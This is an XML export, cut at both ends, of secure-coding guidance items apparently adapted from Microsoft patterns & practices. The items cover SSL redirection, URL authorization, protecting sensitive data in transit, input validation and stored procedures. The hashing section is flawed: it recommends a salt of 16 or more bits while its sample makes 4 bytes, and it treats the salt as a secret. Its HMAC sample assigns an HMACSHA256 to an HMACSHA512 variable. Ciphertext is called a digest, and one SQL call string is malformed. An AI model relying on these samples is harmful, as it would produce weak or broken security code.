 require SSL. It can also lead to unnecessary use of SSL, which does have an associated performance hit.&lt;/p&gt;
&lt;p&gt;The fix for both of these issues is to use absolute URLs that explicitly specify the protocol instead of relative URLs. An example redirection using an absolute URL is shown below.&lt;/p&gt;
&lt;pre&gt;private void btnLogon_Click( object sender, System.EventArgs e ){// Form an absolute path using the server name and v-dir namestring serverName = HttpUtility.UrlEncode(Request.ServerVariables[&amp;quot;SERVER_NAME&amp;quot;]);string vdirName = Request.ApplicationPath;Response.Redirect(&amp;quot;https://&amp;quot; &amp;#43; serverName &amp;#43; vdirName &amp;#43; &amp;quot;/Restricted/Login.aspx&amp;quot;);}&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Use URL Authorization Restrict Access&lt;/strong&gt;: Use an &lt;strong&gt;&amp;lt;authorization&amp;gt;&lt;/strong&gt; element to ensure that only authenticated users can access secure pages. Place this element beneath the closing
&lt;strong&gt;&amp;lt;/system.web&amp;gt;&lt;/strong&gt; tag, as shown here.&lt;/p&gt;
&lt;pre&gt;&amp;lt;!-- The secure folder is for authenticated and SSL access only. --&amp;gt;&amp;lt;location path=&amp;quot;Secure&amp;quot; &amp;gt;  &amp;lt;system.web&amp;gt;    &amp;lt;authorization&amp;gt;      &amp;lt;deny users=&amp;quot;?&amp;quot; /&amp;gt;    &amp;lt;/authorization&amp;gt;  &amp;lt;/system.web&amp;gt;&amp;lt;/location&amp;gt;&lt;/pre&gt;
&lt;p&gt;Additionally, the following configuration ensures that unauthenticated users are allowed to access pages in the application's root directory. Place this configuration in the main
&lt;strong&gt;&amp;lt;system.web&amp;gt;&lt;/strong&gt; element.&lt;/p&gt;
&lt;pre&gt;&amp;lt;system.web&amp;gt;  &amp;lt;!-- The virtual directory root folder contains general pages.       Unauthenticated users can view them and they do not need        to be secured with SSL. --&amp;gt;  &amp;lt;authorization&amp;gt;    &amp;lt;allow users=&amp;quot;*&amp;quot; /&amp;gt;  &amp;lt;/authorization&amp;gt;&amp;lt;/system.web&amp;gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; If you use this type of site structure, your application must not rely on the user's identity on the non-SSL pages. In the preceding configuration, no forms authentication ticket is sent for requests for non-SSL pages. As a result,
 the user is considered anonymous. This has implications for related features, such as personalization, that require the user name.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;MyApp is a financial tool that generates reports based on sensitive data. It allows the user to upload the financial data and download the report. Since the application is small, all of its content is located within the same directory. The access control
 is enforced by the web application through checking the required permissions before a given call is executed.&lt;/p&gt;
&lt;p&gt;Since both data and code is within the same directory, it may be possible for an attacker to gain access to the raw financial data.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;MyApp is a financial tool that generates reports based on some sensitive data. It allows the user to upload the financial data and download the report. The application has a dedicated /data/ directory for the financial data. Access to contents within the
 /data/ directory is handled by the server hosting MyApp, making it much more difficult for an unauthorized user to gain access.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about setting up SSL on your application's web server, visit:
&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302411.aspx"&gt;How To: Set Up SSL on a Web Server&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:1780A63B-D445-4DA2-94AB-06D0C40CEAC2"&gt;Guideline: Separate Account Administration from the Main Application Interface&amp;nbsp;&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8A2388A7-FC6F-47D1-B45E-C6CAC8511C78"&gt;Guideline: Perform Role-Based Security Checks
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:14FBF85D-0E97-4CD1-A0EE-D5AA791FA45C"&gt;Guideline: Define a Security Policy
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4CFC9E41-67FB-445F-8D5C-1680EF283D45"&gt;Guideline: Partition Code Into Separate Assemblies
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:EB8D8FDB-1AEB-4923-A8F3-8FF7D90B6B5A"&gt;Guideline: Disable Directory Browsing
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D7F6072-1A5F-472E-9D27-F15E396EAB2E"&gt;Attack: Forceful Browsing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:8D14E285-3827-4005-AE79-1D75B6B2802D"&gt;Checklist Item: Application is Partitioned into Public and Private Domains&lt;/a&gt;
&lt;hr&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>fbcc8a28-01fb-4fdf-a0e8-e4704be8d4ec</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Protect Sensitive Data Over the Network</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Sensitive Data</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use a protocol that allows adequate encryption to protect sensitive data, such as credentials and application-specific data.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;When data is sent over the network, it typically passes through several intermediate relays on its way towards some final destination. Using a safe protocol to transmit information is important because it adds protection against a
&lt;a href="?#ruledisplay:5F929DD7-759F-4412-A9B1-08567CDE9035"&gt;Network Eavesdropping Attack&lt;/a&gt; or
&lt;a href="?#ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D"&gt;Man in the Middle Attack&lt;/a&gt; during transport.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;This is required whenever sensitive data needs to be sent between two hosts, whether it is using the public internet or a private LAN as a transmission medium. Examples include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Communication between web browser and application server. &lt;/li&gt;&lt;li&gt;Communication between application server and database server.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Use the following steps to protect sensitive data over the network:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify sensitive information.&lt;/strong&gt; Sensitive data is any information that is kept secret and should be disclosed only to authorized parties. Common examples of sensitive data include, but are not limited to, names of customers, government issued
 ID numbers, credit card and other financial information, passwords, and private keys. Some industries, such as health care and banking, have regulatory standards that define sensitive information. Use regulatory requirements, as they apply to your application,
 to identify sensitive data. Sensitive data can be defined as follows:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Information that either contains personally identifiable information or can be used to derive personally identifiable information that should not be shared with others.
&lt;/li&gt;&lt;li&gt;Information that a user provides that they would not want shared with other users of the application.
&lt;/li&gt;&lt;li&gt;Information that comes from an external trusted source that is not designed to be shared with users.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Choose an appropriate protection mechanism.&lt;/strong&gt; Choosing the appropriate protection mechanism may depend on various conditions: purpose of the sensitive data, role of the other network party, infrastructure, and supported technologies. Because
 sensitive data must be encrypted when in transit, there are two potential strategies — Encrypt the application data or Encrypt the communication channel:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypt the communication channel.&lt;/strong&gt; Depending on the current infrastructure and the other network party, it is possible to encrypt the connections using SSL, IPSec, or any technologies supported by the remote party. For more information,
 consult the &lt;a href="?#ruledisplay:AE7F27AF-7253-462F-8A29-6AB2AA202C05"&gt;Encrypt Communication Links&lt;/a&gt; guideline.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypt the application data.&lt;/strong&gt; If your application's communication channels cannot be encrypted, encrypt the application data. Hashing or encryption should be used when protecting the application data. Use hashing if the sensitive data will
 be used only for comparison purposes and the actual contents of the data will never need to be recovered. Use encryption if the sensitive data will need be retrieved at a later stage.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Hashing&lt;/strong&gt;: If hashing is used, choose a longer salt, 16 or more bits. The salt is random data that is known only by the application; to guess the value of the original data given the hash, an attacker also has to guess the salt. It is recommended
 to have a longer salt because it provides a bigger input to the hash function. Assuming that the produced hash is compromised, longer salts makes it more difficult for an attacker to gain access to the sensitive data. If your application uses randomly generated
 salt, make sure that your application encrypts the random salt and stores it into a configuration file. Use RNGCryptoServiceProvider to generate the salt. Example:&lt;/p&gt;
&lt;pre&gt;public static byte[] GenerateSalt()&lt;br&gt;{&lt;br&gt;    byte[] randBytes = new byte[4];&lt;br&gt;    RNGCryptoServiceProvider gen = new RNGCryptoServiceProvider();&lt;br&gt;    gen.GetNonZeroBytes(randBytes);&lt;br&gt;    return randBytes;&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;Choosing a strong hashing algorithm is also important. Stronger algorithms prevent multiple unique pieces of data from producing identical hash values. The current recommendation is to use SHA-256 or stronger.&lt;/p&gt;
&lt;pre&gt;public byte[] HashCredentials(byte[] pass, byte[] salt)&lt;br&gt;{&lt;br&gt;    HMACSHA512 md;&lt;br&gt;    byte[] digest; &lt;br&gt;    md = new HMACSHA256(salt);&lt;br&gt;    md.Initialize();&lt;br&gt;    digest = md.ComputeHash(pass);&lt;br&gt;    md.Clear();&lt;br&gt;    return digest;&lt;br&gt;}&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypting&lt;/strong&gt;: If encryption is used, use a key size of 256-bit or higher for symmetric encryption and 2048-bit or higher for public/private key encryption. Use AES for symmetric encryption or RSA for public/private key encryption. You should
 use symmetric encryption if and only if your application is the only entity that will access the encrypted data. If the data will be accessed by more than one parties, use public/private key encryption. Public/private key encryption allows your application
 to share sensitive data with multiple entities without disclosing its own encryption key.&lt;/p&gt;
&lt;pre&gt;Rijndael encMD;ICryptoTransform encCT;&lt;br&gt;byte[] digest;&lt;br&gt;// The following code obtains the encryption key and initialization vector&lt;br&gt;// from the application's key repository. Consult the &lt;a href="?#ruledisplay:440137A2-948A-4485-A137-E3CC8207F801"&gt;Use a Secure Key Storage Location&lt;/a&gt;&lt;br&gt;// guideline for more details when handling encryption keys.&lt;br&gt;encMD = Rijndael.Create();&lt;br&gt;encMD.Key = MyApp.Crypto.GetEncryptionKey();&lt;br&gt;encMD.IV = MyApp.Crypto.GetEncryptionIV();&lt;br&gt;encCT = encMD.CreateEncryptor(); &lt;br&gt;// Note that sensitiveData is of type byte[] and contains&lt;br&gt;// data that is sensitive in nature&lt;br&gt;digest = encCT.TransformFinalBlock(sensitiveData, 0, sensitiveData.Length);&lt;br&gt;encMD.Clear();&lt;/pre&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Apply the appropriate protection mechanism&lt;/strong&gt;: Evaluate the code and determine the places where sensitive data is transmitted. Apply the established protection mechanism at each location. For instance, if your application processes credit card
 transactions across a hostile network environment, encrypt the credit card information before transmitting it to the appropriate network entity:&lt;/p&gt;
&lt;pre&gt;void ProcessPayment(byte[] ccInfo, float amount)&lt;br&gt;{&lt;br&gt;    byte[] ccDigest = MyApp.Crypto.EncryptCCInfo(ccInfo);&lt;br&gt;    SqlConnection connection;&lt;br&gt;    SqlCommand command;&lt;br&gt;    SqlDataReader result;&lt;br&gt;    string query = &amp;quot;execute QueuePayment @ccDigest @amount;&amp;quot;;&lt;br&gt;    connection = MyApp.DBManager.GetDBConnection();&lt;br&gt;    command = new SqlCommand(query, connection);&lt;br&gt;    command.Parameters.Add(&amp;quot;@ccDigest&amp;quot;, System.Data.SqlDbType.Binary);&lt;br&gt;    command.Parameters[&amp;quot;@ccDigest&amp;quot;].Value = ccDigest;&lt;br&gt;    command.Parameters.Add(&amp;quot;@amount&amp;quot;, System.Data.SqlDbType.Float);&lt;br&gt;    command.Parameters[&amp;quot;@amount&amp;quot;].Value = amount;&lt;br&gt;    ...&lt;br&gt;}&lt;/pre&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An e-commerce application written in ASP.NET enables customers to pay their bills online through a unified broker. The application's web component relies on an independent account management system that resides on another server. The web component communicates
 with the account management system using a SQL socket connection. The two servers are located in a competitively priced data center that houses a number of other customers, all of which are able to access the building at all times. A malicious user purchases
 hosting services at the same company, and after exploring the hosting environment, learns that the hosted accounts are networked using a shared bus topology that allows for network snooping. Because SQL connections are not encrypted by default, the attacker
 is able to setup a sniffer and capture all of the communication between the account management component and the web component. This enabled the attacker to login as a legitimate user on the account management server and make changes at will.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;An e-commerce application written in ASP.NET enables customers to pay their bills online through a unified broker. The application's web component relies on an independent account management system that resides on another server. The web component communicates
 with the account management system using a SQL socket connection. The two servers are located in a competitively priced data center that houses a number of other customers, all of which are able to access the building at all times. The application's developers
 encrypt the payment information before transmitting it to the other network entity.&lt;/p&gt;
&lt;pre&gt;void ProcessPayment(byte[] ccInfo, float amount)&lt;br&gt;{&lt;br&gt;    byte[] ccDigest = MyApp.Crypto.EncryptCCInfo(ccInfo);&lt;br&gt;    SqlConnection connection;&lt;br&gt;    SqlCommand command;&lt;br&gt;    SqlDataReader result; &lt;br&gt;    string query = &amp;quot;execute QueuePayment @ccDigest @amount;&amp;quot;;&lt;br&gt;    connection = MyApp.DBManager.GetDBConnection();&lt;br&gt;    command = new SqlCommand(query, connection);&lt;br&gt;    command.Parameters.Add(&amp;quot;@ccDigest&amp;quot;, System.Data.SqlDbType.Binary);&lt;br&gt;    command.Parameters[&amp;quot;@ccDigest&amp;quot;].Value = ccDigest;&lt;br&gt;    command.Parameters.Add(&amp;quot;@amount&amp;quot;, System.Data.SqlDbType.Float);&lt;br&gt;    command.Parameters[&amp;quot;@amount&amp;quot;].Value = amount;&lt;br&gt;    ...&lt;br&gt;} &lt;br&gt;... &lt;br&gt;public byte[] EncryptCCInfo(byte[] ccInfo)&lt;br&gt;{&lt;br&gt;    Rijndael encMD;&lt;br&gt;    ICryptoTransform encCT;&lt;br&gt;    byte[] digest;&lt;br&gt;    encMD = Rijndael.Create();&lt;br&gt;    encMD.Key = MyApp.Crypto.GetEncryptionKey();&lt;br&gt;    encMD.IV = MyApp.Crypto.GetEncryptionIV();&lt;br&gt;    encCT = encMD.CreateEncryptor();&lt;br&gt;    digest = encCT.TransformFinalBlock(ccInfo, 0, ccInfo.Length);&lt;br&gt;    encMD.Clear();&lt;br&gt;    return digest;&lt;br&gt;}&lt;/pre&gt;
&lt;p&gt;Because data between the two components is encrypted, the transmission medium is less likely to affect the application's ability to securely transmit payment information.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;li&gt;For more information on using IPSec between two servers, see: &lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT18.asp"&gt;
Use IPSec to Provide Secure Communication Between Two Servers&lt;/a&gt; &lt;/li&gt;&lt;li&gt;For more information on using IPSec filtering, see: &lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/HTUseIPSec.asp"&gt;
Use IPSec for Filtering Ports and Authentication&lt;/a&gt; &lt;/li&gt;&lt;li&gt;For more information on IPSec policies, see: &lt;a href="http://support.microsoft.com/kb/816521"&gt;
Use IPSec Policy to Secure Terminal Services Communications in Windows Server 2003&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;For more information on using SSL with SQL Server, see: &lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT19.asp"&gt;
Use SSL to Secure Communication with SQL Server&lt;/a&gt; &lt;/li&gt;&lt;li&gt;For more information on setting up SSL, see: &lt;a href="http://msdn2.microsoft.com/en-us/library/ms181053(VS.80).aspx"&gt;
Set Up Secure Sockets Layer (SSL)&lt;/a&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:AE7F27AF-7253-462F-8A29-6AB2AA202C05"&gt;Guideline: Encrypt Communication Links
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:440137A2-948A-4485-A137-E3CC8207F801"&gt;Guideline: Use a Secure Key Storage Location
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B9E7568A-907C-43C9-9CED-F0CCA09F76CB"&gt;Guideline: Use SSL When Transmitting Credentials
&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:13EE90D9-B0F6-45D6-913A-BA8527525A04"&gt;Attack: Traffic Analysis Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B47A6486-A73E-44B9-AD17-1F7F94199828"&gt;Attack: Network Credential Sniffing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:5F929DD7-759F-4412-A9B1-08567CDE9035"&gt;Attack: Network Eavesdropping Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D"&gt;Attack: Man in the Middle Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:09E595AD-36E7-4E36-B34C-7321C8445887"&gt;Checklist Item: Sensitive Data is Protected Over the Network
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
&lt;/li&gt;</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>fc0b1787-0663-4625-88ac-8e71e2975a36</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Constrain, Reject, and Sanitize Input</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Check for known good data by validating for type, length, format, and range. Reject known bad input and then sanitize the input.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;There are no assumptions of trust that can be made regarding the safety of unchecked input. Most application-level attacks involve malicious input. Failure to validate input means that data could contain database injection attacks.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;All applications should constrain and sanitize their input.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;The preferred approach to validating input is to constrain what you allow from the beginning. It is much easier to validate data for known valid types, patterns, and ranges than it is to validate data by looking for known bad characters. When you design
 your application, you know what your application expects. The range of valid data is generally a more finite set than potentially malicious input. However, for defense in depth you may also want to reject known bad input and then sanitize the input. The recommended
 strategy is shown in Figure 4.4.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Input validation strategy: constrain, reject, and sanitize input&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;To create an effective input validation strategy, be aware of the following approaches and their tradeoffs:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Constrain input&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Validate data for type, length, format, and range&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Reject known bad input&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Sanitize input&lt;/strong&gt;. &lt;/li&gt;&lt;/ul&gt;
&lt;h2&gt;Constrain Input&lt;/h2&gt;
&lt;p&gt;Constraining input is about allowing good data. This is the preferred approach. The idea here is to define a filter of acceptable input by using type, length, format, and range. Define what is acceptable input for your application fields and enforce it.
 Reject everything else as bad data.&lt;/p&gt;
&lt;p&gt;Constraining input may involve setting character sets on the server so that you can establish the canonical form of the input in a localized way.&lt;/p&gt;
&lt;h2&gt;Validate Data for Type, Length, Format, and Range&lt;/h2&gt;
&lt;p&gt;Use strong type checking on input data wherever possible, for example, in the classes used to manipulate and process the input data and in data access routines. For example, use parameterized stored procedures for data access to benefit from strong type
 checking of input fields.&lt;/p&gt;
&lt;p&gt;String fields should also be length checked and in many cases checked for appropriate format. For example, ZIP codes, personal identification numbers, and so on have well defined formats that can be validated using regular expressions. Thorough checking
 is not only good programming practice; it makes it more difficult for an attacker to exploit your code. The attacker may get through your type check, but the length check may make executing his favorite attack more difficult.&lt;/p&gt;
&lt;h2&gt;Reject Known Bad Input&lt;/h2&gt;
&lt;p&gt;Deny &amp;quot;bad&amp;quot; data; although do not rely completely on this approach. This approach is generally less effective than using the &amp;quot;allow&amp;quot; approach described earlier and it is best used in combination. To deny bad data assumes your application knows all the variations
 of malicious input. Remember that there are multiple ways to represent characters. This is another reason why &amp;quot;allow&amp;quot; is the preferred approach.&lt;/p&gt;
&lt;p&gt;While useful for applications that are already deployed and when you cannot afford to make significant changes, the &amp;quot;deny&amp;quot; approach is not as robust as the &amp;quot;allow&amp;quot; approach because bad data, such as patterns that can be used to identify common attacks, do
 not remain constant. Valid data remains constant while the range of bad data may change over time.&lt;/p&gt;
&lt;h2&gt;Sanitize Input&lt;/h2&gt;
&lt;p&gt;Sanitizing is about making potentially malicious data safe. It can be helpful when the range of input that is allowed cannot guarantee that the input is safe. This includes anything from stripping a null from the end of a user-supplied string to escaping
 out values so they are treated as literals.&lt;/p&gt;
&lt;p&gt;Another common example of sanitizing input in Web applications is using URL encoding or HTML encoding to wrap data and treat it as literal text rather than executable script.
&lt;strong&gt;HtmlEncode&lt;/strong&gt; methods escape out HTML characters, and &lt;strong&gt;UrlEncode&lt;/strong&gt; methods encode a URL so that it is a valid URI request.&lt;/p&gt;
&lt;h3&gt;In Practice&lt;/h3&gt;
&lt;p&gt;The following are examples applied to common input fields, using the preceding approaches:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Last&lt;/strong&gt; &lt;strong&gt;Name field&lt;/strong&gt;. This is a good example where constraining input is appropriate In this case, you might allow string data in the range ASCII A-Z and a-z, and also hyphens and curly apostrophes (curly apostrophes have no
 significance to SQL) to handle names such as O'Dell. You would also limit the length to your longest expected value.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Quantity field&lt;/strong&gt;. This is another case where constraining input works well. In this example, you might use a simple type and range restriction. For example, the input data may need to be a positive integer between 0 and 1000.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Free-text field&lt;/strong&gt;. Examples include comment fields on discussion boards. In this case, you might allow letters and spaces, and also common characters such as apostrophes, commas, and hyphens. The set that is allowed does not include less
 than and greater than signs, brackets, and braces.
&lt;p&gt;Some applications might allow users to mark up their text using a finite set of script characters, such as bold &amp;quot;&amp;lt;b&amp;gt;&amp;quot;, italic &amp;quot;&amp;lt;i&amp;gt;&amp;quot;, or even include a link to their favorite URL. In the case of a URL, your validation should encode the value so that it is
 treated as a URL. &lt;/p&gt;
&lt;p&gt;For more information about validating free text fields, see &amp;quot;Input Validation&amp;quot; in Chapter 10, &amp;quot;&lt;a href="http://msdn.microsoft.com/library/en-us/dnnetsec/html/THCMCh10.asp"&gt;Building Secure ASP.NET Pages and Controls&lt;/a&gt;.&amp;quot;
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;An existing Web application that does not validate user input&lt;/strong&gt;. In an ideal scenario, the application checks for acceptable input for each field or entry point. However, if you have an existing Web application that does not validate user
 input, you need a stopgap approach to mitigate risk until you can improve your application's input validation strategy. While neither of the following approaches ensures safe handling of input, because that is dependent on where the input comes from and how
 it is used in your application, they are in practice today as quick fixes for short-term security improvement:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;HTML-encoding and URL-encoding user input when writing back to the client&lt;/strong&gt;. In this case, the assumption is that no input is treated as HTML and all output is written back in a protected form. This is sanitization in action.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Rejecting malicious script characters&lt;/strong&gt;. This is a case of rejecting known bad input. In this case, a configurable set of malicious characters is used to reject the input. As described earlier, the problem with this approach is that bad data
 is a matter of context. &lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;For more information and examples of input coding, using regular expressions, and ASP.NET validation controls, see &amp;quot;Input Validation&amp;quot; in Chapter 10, &amp;quot;Building Secure ASP.NET Pages and Controls.&amp;quot; at
&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302426.aspx"&gt;http://msdn2.microsoft.com/en-us/library/aa302426.aspx&lt;/a&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information see, &amp;quot;Chapter 4 - Design Guidelines for Secure Web Applications&amp;quot; at
&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt;&amp;nbsp;&amp;nbsp;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>fea6be3f-5d03-4400-b4a6-c23db56863a3</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use Stored Procedures</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Data Access</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Always use stored procedures when interacting with a database. This increases performance and reduces the risk of a successful SQL injection attack.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Attackers can use a &lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;
SQL Injection Attack&lt;/a&gt; to manipulate the database in unforeseen ways. SQL injection allows an attacker to assume the credentials of the SQL account used to connect to the database, which may lead to arbitrary reading, writing, updating or deleting of data.
 In an improperly secured database, this can also lead to remote code execution through the use of certain stored procedures that allow for direct Operating System command injection.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Stored procedures should be used whenever interaction with a database is required.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Create the stored procedure on the database. &lt;/strong&gt;This can be done using the following SQL syntax:&lt;br&gt;
&lt;br&gt;
Since stored procedures reside on the database server, you need to create the appropriate stored procedures on your application's database server. The following example creates a stored procedure on an Oracle database server:
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;pre&gt;CREATE OR REPLACE PROCEDURE&lt;br&gt; PlaceOrder(custID INT, itemID INT, qty INT)&lt;br&gt; ISBEGIN&lt;br&gt;   INSERT INTO PendingPurchases (customer, item, quantity)&lt;br&gt;    VALUES (custID, itemID, qty);END PlaceOrder;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;div&gt;&lt;strong&gt;Call the stored procedure. &lt;/strong&gt;This can be done&amp;nbsp;using the following Java code:&lt;/div&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
